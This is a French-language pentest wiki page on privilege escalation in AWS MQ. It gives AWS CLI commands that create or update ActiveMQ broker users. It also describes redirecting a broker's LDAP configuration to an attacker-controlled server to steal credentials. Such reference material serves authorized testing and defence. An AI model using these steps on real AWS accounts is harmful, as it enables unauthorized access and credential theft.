# AWS - MQ Privesc

{{#include ../../../banners/hacktricks-training.md}}

## MQ

Pour plus d'informations sur MQ, consultez :

{{#ref}}
../aws-services/aws-mq-enum.md
{{#endref}}

### `mq:ListBrokers`, `mq:CreateUser`

Avec ces permissions, vous pouvez **créer un nouvel utilisateur dans un broker ActimeMQ** (cela ne fonctionne pas dans RabbitMQ) :
```bash
aws mq list-brokers
aws mq create-user --broker-id <value> --console-access --password <value> --username <value>
```
**Impact potentiel :** Accéder à des informations sensibles en naviguant dans ActiveMQ

### `mq:ListBrokers`, `mq:ListUsers`, `mq:UpdateUser`

Avec ces autorisations, vous pouvez **créer un nouvel utilisateur dans un broker ActiveMQ** (cela ne fonctionne pas dans RabbitMQ) :
```bash
aws mq list-brokers
aws mq list-users --broker-id <value>
aws mq update-user --broker-id <value> --console-access --password <value> --username <value>
```
**Impact potentiel :** Accéder à des informations sensibles en naviguant à travers ActiveMQ

### `mq:ListBrokers`, `mq:UpdateBroker`

Si un courtier utilise **LDAP** pour l'autorisation avec **ActiveMQ**. Il est possible de **changer** la **configuration** du serveur LDAP utilisé pour **un contrôlé par l'attaquant**. De cette manière, l'attaquant pourra **voler tous les identifiants envoyés via LDAP**.
```bash
aws mq list-brokers
aws mq update-broker --broker-id <value> --ldap-server-metadata=...
```
Si vous pouviez d'une manière ou d'une autre trouver les identifiants originaux utilisés par ActiveMQ, vous pourriez effectuer un MitM, voler les identifiants, les utiliser sur le serveur d'origine et envoyer la réponse (peut-être qu'en réutilisant simplement les identifiants volés, vous pourriez faire cela).

**Impact potentiel :** Voler les identifiants ActiveMQ

{{#include ../../../banners/hacktricks-training.md}}
